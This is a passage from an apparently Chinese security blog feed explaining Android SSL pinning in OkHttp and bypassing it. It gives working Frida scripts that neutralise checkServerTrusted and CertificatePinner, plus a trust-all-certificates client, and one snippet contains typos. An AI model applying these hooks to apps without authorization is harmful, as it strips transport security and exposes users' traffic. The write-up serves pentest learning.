class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//这段代码的目的是hook CertificatePinner类的所有返回类型为 void 的方法，并在这些方法被调用时打印一条消息到控制台</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificatePinnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">CertificatePinnerClassName</span>)  <span class="comment">//CertificatePinner类</span></span><br><span class="line">        <span class="keyword">var</span> methods = <span class="title class_">CertificatePinnerClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()  <span class="comment">//得到CertificatePinner的所有方法</span></span><br><span class="line">        methods.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">method</span>)&#123;  <span class="comment">//遍历所有的方法</span></span><br><span class="line">            <span class="keyword">if</span>(method.<span class="title function_">getReturnType</span>().<span class="title function_">getName</span>() == <span class="string">&#x27;void&#x27;</span>)&#123;  <span class="comment">//判断如果方法返回类型为void</span></span><br><span class="line">                <span class="keyword">var</span> methodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(methodName+<span class="string">&quot; Hooked!&quot;</span>)</span><br><span class="line">                <span class="title class_">CertificatePinnerClass</span>[methodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">overload</span>)&#123;  <span class="comment">//遍历当前方法的所有重载方法</span></span><br><span class="line">                    <span class="keyword">if</span>(overload.<span class="property">returnType</span>.<span class="property">name</span> == <span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;certificatePinner check called!&quot;</span>)</span><br><span class="line">                        &#125;   </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP抓包 </tag>
            
            <tag> sslunpinning </tag>
            
            <tag> okhttp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓包之sslunpinning</title>
      <link href="/2024/07/04/%E6%8A%93%E5%8C%85%E4%B9%8Bsslunpinning/"/>
      <url>/2024/07/04/%E6%8A%93%E5%8C%85%E4%B9%8Bsslunpinning/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-客户端段SSL证书绑定"><a href="#0x01-客户端段SSL证书绑定" class="headerlink" title="0x01 客户端段SSL证书绑定"></a>0x01 客户端段SSL证书绑定</h1><p>SSL Pinning 也称为证书锁定，是Google官方推荐的检验方式，意思是将服务器提供的SSL&#x2F;TLS证书内置到移动客户端，当客户端发起请求的时候，通过对比内置的证书与服务器的证书是否一致，来确认这个连接的合法性。</p><p>SSL Pinning 一般实现方式有两种</p><ul><li>一种是在代码层进行校验</li><li>一种是通过配置文件network_security_config.xml进行配置实现校验。</li></ul><h2 id="代码层实现"><a href="#代码层实现" class="headerlink" title="代码层实现"></a>代码层实现</h2><p>以常见的OKHttp网络框架举例，在代码层面校验证书的代码如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051610003.png" alt="image.png"> </p><p>详细的代码实现可以参考：</p><p><a href="https://github.com/act0rn/https-capture/blob/main/NetCaptureTest/app/src/main/java/com/actorn/netcapture/MainActivity.java">https-capture&#x2F;NetCaptureTest&#x2F;app&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;actorn&#x2F;netcapture&#x2F;MainActivity.java at main · act0rn&#x2F;https-capture (github.com)</a></p><h2 id="配置文件实现"><a href="#配置文件实现" class="headerlink" title="配置文件实现"></a>配置文件实现</h2><p>通过 res&#x2F;xml&#x2F;network_security_config.xml 进行配置，实现SSL Pinning，配置文件可以分为两种，使用证书校验和公钥校验。</p><ul><li><p>使用证书锁定，由于CA签发证书存在有效期的问题，所以在证书续期后，需要将证书重新内置到App中（不方便，应用较少）。</p></li><li><p>使用公钥锁定，需要提取证书中的公钥并内置到app中，公钥在证书续期后可以保持不变(即密钥对可以不变)，可以避免有效期问题。</p></li></ul><p>下面我们先看看证书锁定和公钥锁定的具体配置实现：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051626956.png" alt="image.png"> </p><h2 id="单向认证校验流程"><a href="#单向认证校验流程" class="headerlink" title="单向认证校验流程"></a>单向认证校验流程</h2><p>具体的SSLPinning的交互过程，可以使用如下流程图来表示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051627575.jpeg" alt="img"> </p><p>通过SSL PINNING绑定证书以后，设置系统代理，即使将抓包工具的证书导入到系统目录，抓包时依然会发现App报错：javax.net.ssl.SSLPeerUnverifiedException: Certificate pinning failure! 或者 javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.，报错的原因是<strong>APP预置的证书信息与服务端返回的证书信息校验不一致，导致握手失败</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051633231.png" alt="img"> </p><h1 id="0x02-SSLPinning原理"><a href="#0x02-SSLPinning原理" class="headerlink" title="0x02 SSLPinning原理"></a>0x02 SSLPinning原理</h1><h2 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051659654.png" alt="image.png"> </p><p>将代码分为以下几个部分：</p><ol><li>调用x509的标准，创建了一个证书（包含公钥、签发信息等等）；</li><li>生成证书仓库keyStore并初始化，将第一步创建的证书加载到keyStore中；</li><li>首先拿到默认的信任管理器工厂，将keyStore加载进去，也就是说，只要有存在于KeyStore中的证书，是可以校验通过的；</li><li>新建了SSL的对象，用来做SSL握手。进行了init初始化，里面有三个参数：</li><li>km:null&#x3D;&#x3D;&gt;做服务端校验（服务端校验客户端证书)</li><li>trustManagers&#x3D;&#x3D;&gt;做客户端校验（客户端校验服务端证书）</li><li>new SecureRandom()&#x3D;&#x3D;&gt;SSL握手过程中创建随机数，安全考虑</li><li>上面的四个步骤其实都是为下面做铺垫的，这块调用了OKHttp.builder框架，实现了<strong>信任证书工厂中的证书，不信任系统证书</strong>。【第一层校验】</li><li>证书绑定，也是SSLPinning的一种校验方式。【第二次校验】</li><li>HostnameVerifier，也是一种校验方式【第三层校验】</li></ol><p>下面的代码可以看做是一些常见的<code>SSLPinning</code>实现的代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一种校验方式：HostnameVerifier</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendRequestWithOkHttp1</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="type">OkHttpClient</span> <span class="variable">mClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder().sslSocketFactory(HttpsTrustAllCerts.createSSLSocketFactory(),<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>()).hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>.TrustAllHostnameVerifier()).build();</span><br><span class="line">               <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                       .url(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> mClient.newCall(request).execute();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">                   showResponse(responseData);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种校验方式：OKHttp.builder校验</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendRequestWithOkHttp2</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">               <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                       .url(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">                   showResponse(responseData);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//第三种校验：CertificatePinner证书绑定</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendRequestWithOkHttp3</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_DOMAIN</span> <span class="operator">=</span> <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">               <span class="comment">//获取公钥：</span></span><br><span class="line">               <span class="comment">//openssl s_client -connect www.baidu.com:443 -servername www.baidu.com | openssl x509 -pubkey -noout | openssl rsa -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64</span></span><br><span class="line">               <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_PUBLIC_KEY</span> <span class="operator">=</span> <span class="string">&quot;sha256/Zhv4cvwdHmEmE0edWEcIdmLfwsqxrrOmp+vbngwNnrU=&quot;</span>;</span><br><span class="line">               <span class="type">CertificatePinner</span> <span class="variable">pinner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.Builder()</span><br><span class="line">                       .add(CA_DOMAIN,CA_PUBLIC_KEY)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder().certificatePinner(pinner).build();</span><br><span class="line">               <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                       .url(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">                   showResponse(responseData);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="【举例】X509TrustManager校验实现"><a href="#【举例】X509TrustManager校验实现" class="headerlink" title="【举例】X509TrustManager校验实现"></a>【举例】X509TrustManager校验实现</h2><h3 id="X509TrustManager类介绍"><a href="#X509TrustManager类介绍" class="headerlink" title="X509TrustManager类介绍"></a>X509TrustManager类介绍</h3><p>在JSSE中，证书信任管理器类就是实现了接口X509TrustManager的类。我们可以自己实现该接口，让它信任我们指定的证书。</p><p>接口X509TrustManager有下述三个公有的方法需要我们实现：</p><p><strong>⑴ void checkClientTrusted(X509Certificate[] chain, String authType)throws CertificateException</strong></p><p>该方法检查客户端的证书，若不信任该证书则抛出异常。由于我们不需要对客户端进行认证，因此我们只需要执行默认的信任管理器的这个方法。JSSE中，默认的信任管理器类为TrustManager。</p><p><strong>⑵ void checkServerTrusted(X509Certificate[] chain, String authType)throws CertificateException</strong></p><p>该方法检查服务器的证书，若不信任该证书同样抛出异常。通过自己实现该方法，可以使之信任我们指定的任何证书。在实现该方法时，也可以简单的不做任何处理，即一个空的函数体，由于不会抛出异常，它就会信任任何证书。</p><p><strong>⑶ X509Certificate[] getAcceptedIssuers()</strong></p><p>返回受信任的X509证书数组。</p><p>自己实现了信任管理器类，如何使用呢？</p><p>类HttpsURLConnection似乎并没有提供方法设置信任管理器。其实，HttpsURLConnection通过SSLSocket来建立与HTTPS的安全连接，SSLSocket对象是由SSLSocketFactory生成的。HttpsURLConnection提供了方法setSSLSocketFactory(SSLSocketFactory)设置它使用的SSLSocketFactory对象。SSLSocketFactory通过SSLContext对象来获得，在初始化SSLContext对象时，可指定信任管理器对象。下面用一个图简单表示这几个JSSE类的关系：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062008386.png" alt="image-20240706200808341"> </p><h3 id="SSLPinning原理-代码实现"><a href="#SSLPinning原理-代码实现" class="headerlink" title="SSLPinning原理&amp;代码实现"></a>SSLPinning原理&amp;代码实现</h3><p>原理是—&gt;（不信任系统库证书，只信任自己的证书）</p><p>1、正常情况，要是不对<code>X509TrustManager</code>接口中的方法（<strong>checkServerTrusted</strong>）进行重写的话，客户端默认是信任所有证书的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061940020.png" alt="image.png"> </p><p>2、但如果有做了校验的话，客户端会根据设置校验服务端的证书。</p><p>下图中的代码，是自己设置了一个证书（CA证书申请是要钱的），但如果是自己只做的证书，手机是不认可的，所有用代码实现了校验。。。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061941677.png" alt="image.png"> </p><p>3、代码中引入了trustManagers，<code>trustManagers</code>是一个数组。在trustManagers里面包含了一个keyStore，keyStore里面就是我们定义好的证书    </p><p>所以，就是在trustManagers中存放了我们自己定义好的证书，我们才可以校验通过。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061942299.png" alt="image.png"> </p><p>所以，这块针对与客户端来说，做了SSL证书绑定之后，默认是不信任系统证书列表中的证书的。简单来说就是，即时将Charles证书放到了系统证书列表中，相对于设置了trustManagers的客户端而言，服务端给到<code>Charle</code>证书不是在定义好的证书商店中，所以这块会校验不通过。</p><p>4、 “<strong>TrustManager[]  trustManagers</strong>“ 信任管理器。</p><p>trustManager是一个接口，在里面定义了实现类，这块用的是<strong>X509TrustManager类</strong>，里面定义了一个 <strong>checkServerTrusted</strong>方法，如下：</p><p>平常针对APP的校验逻辑一般都是写在这个方法里面的</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061948034.png" alt="image.png"> </p><p>这块如果将 <strong>checkServerTrusted</strong>方法体置空，默认是信任所有证书的。也就是说，如果遮掩个设置了，即使Charles的证书不在系统证书列表中也是可以正常抓包的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061950840.png" alt="image-20240706195000810">  </p><p>同理，如果要实现SSLPinning校验，那就可以对 <strong>checkServerTrusted</strong>方法进行重写，如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509TrustManager tm, X509Certificate[] chain,</span></span><br><span class="line"><span class="params">        String authType, OpenSSLSocketImpl socket)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkTrusted(<span class="string">&quot;checkServerTrusted&quot;</span>, tm, chain, authType, Socket.class, socket)</span><br><span class="line">            &amp;&amp; !checkTrusted(<span class="string">&quot;checkServerTrusted&quot;</span>, tm, chain, authType, String.class,</span><br><span class="line">                             socket.getHandshakeSession().getPeerHost())) &#123;</span><br><span class="line">        tm.checkServerTrusted(chain, authType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、所以，站在渗透角度而言，我们只需要将不信任的代码给他hook掉就可以了。</p><p>在 <strong>checkServerTrusted</strong>方法处打断点，可以看一下它服务端证书校验的信任过程：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061958390.png" alt="image.png"> </p><p>有一个变量 <code>&quot;chain&quot;</code>，这个里面就是它的证书校验链。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061958221.png" alt="image.png"> </p><p>如果校验不通过，就会抛出一个异常。这块将它直接给hook掉。。。</p><h1 id="0x03-Frida-Hook实现sslunpinning"><a href="#0x03-Frida-Hook实现sslunpinning" class="headerlink" title="0x03 Frida Hook实现sslunpinning"></a>0x03 Frida Hook实现sslunpinning</h1><h2 id="checkServerTrusted-方法"><a href="#checkServerTrusted-方法" class="headerlink" title="checkServerTrusted 方法"></a>checkServerTrusted 方法</h2><p>根据前面的代码，可以得到<code>checkServerTrusted</code>校验的整个逻辑如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checkServerTrusted方法 ————&gt; 归属于X509TrustManager类</span><br><span class="line">X509TrustManager类————&gt;是TrustManager接口的一个实现类</span><br><span class="line">TrustManager[]数组————&gt;里面定义了所有需要校验的内容</span><br></pre></td></tr></table></figure><p>X509TrustManager类有三个方法：</p><ul><li>checkServerTrusted：校验服务端</li><li>checkClientTrusted：校验客户端</li><li>getAcceptIssuers：证书信任链</li></ul><p>所以，Hook的原理就是：<strong>将所有实现了 TrustManager 接口实现类中的 checkServerTrusted 方法给hook掉</strong></p><p>1、首先，枚举进行匹配，打印出所有实现了<code>TrustManager 接口</code>的类</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">preform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//定义一个函数，用来判断某个类是否继承了某个接口</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">className，interfaceName</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//首先声明TrustManager接口</span></span><br><span class="line">        <span class="keyword">var</span> trustManagerInterface =<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.TrustManager&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用Frida的API：Java.enumerateLoadedClasses枚举内存中的所有类</span></span><br><span class="line">        <span class="comment">//再调用前面定义好的函数checkIsImplementInterface来判断当前类是否实现了TrustManager接口</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className,trustManagerInterface))&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(className);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                consoole.<span class="title function_">log</span>(<span class="string">&#x27;done!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用后，成功打印出了实现了TrustManager接口的类。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062022974.png" alt="image.png"> </p><p>2、将实现接口类中的checkServerTrusted方法hook掉</p><p>这块使用for循环打印来做，是为了防止有重载的情况。。。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个函数，用来判断某个类是否实现或继承了某个接口</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">className, interfaceName</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> trustManagerInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.net.ssl.TrustManager&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">className</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, trustManagerInterface))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(className); <span class="comment">//打印出实现了TrustManager接口的类名</span></span><br><span class="line">                <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">                <span class="keyword">var</span> len = targetClass[<span class="string">&quot;checkServerTrusted&quot;</span>].<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                    targetClass[<span class="string">&quot;checkServerTrusted&quot;</span>].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;checkServerTrusted called&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">                </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;done&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">  &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062023359.png" alt="image-20240706202348324"> </p><p>可以看到这块使用Charle是可以成功抓取到数据包的，内容也成功加载出来了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062024193.png" alt="image.png"> </p><p>3、但是Frida脚本报错了，报错原因是说 “hook的方法没有设定返回值”</p><p>这块猜测原因为：hook的一些类的checkServerTrusted方法，有的是有返回值的，有的没有。这块修改代码如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062025263.png" alt="image.png"> </p><h2 id="certificatePinner证书绑定"><a href="#certificatePinner证书绑定" class="headerlink" title="certificatePinner证书绑定"></a>certificatePinner证书绑定</h2><p>certificatePinner的作用就是提前做一个证书校验，将证书的哈希值提前预存进去，每次建立连接的时候，会先校验服务端证书的哈希是否和本地匹配。</p><p>这块以OkHttpClient初始化部分改为下面代码锁定证书：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">CertificatePinner</span> certificatePinner = <span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.<span class="title class_">Builder</span>()</span><br><span class="line">        .<span class="title function_">add</span>(<span class="string">&quot;*.taobao.com&quot;</span>, <span class="string">&quot;sha256/IfXz1a0gWBA5oH+zasmRutUiyoZN3I8wLxHNQxk3NVo=&quot;</span>)</span><br><span class="line">        .<span class="title function_">add</span>(<span class="string">&quot;*.taobao.com&quot;</span>, <span class="string">&quot;sha256/IQBnNBEiFuhj+8x6X8XLgh01V9Ic5/V3IRQLNFFc7v4=&quot;</span>)</span><br><span class="line">        .<span class="title function_">add</span>(<span class="string">&quot;*.taobao.com&quot;</span>, <span class="string">&quot;sha256/K87oWBWM9UZfyddvDfoxL+8lpNyoUB2ptGtn0fv6G2Q=&quot;</span>)</span><br><span class="line">        .<span class="title function_">build</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">OkHttpClient</span> okHttpClient = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().<span class="title function_">newBuilder</span>().<span class="title function_">certificatePinner</span>(certificatePinner).<span class="title function_">build</span>();</span><br></pre></td></tr></table></figure><p>这块的hash值可以使用 CertificatePinner.pin(certificate)来获取。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062350770.png" alt="image.png"> </p><p>这样通过代理证书肯定是无法请求到数据和抓包了，使用下面代码Hook：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookCertificatePinner</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Builer</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;okhttp3.CertificatePinner$Builder&quot;</span>);</span><br><span class="line">        <span class="title class_">Builer</span>.<span class="property">add</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Frida Hook hookCertificatePinner()&quot;</span>, <span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hook之后可以正常取得数据并抓到了：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062351168.gif" alt="img"> </p><h2 id="HostnameVerifier校验"><a href="#HostnameVerifier校验" class="headerlink" 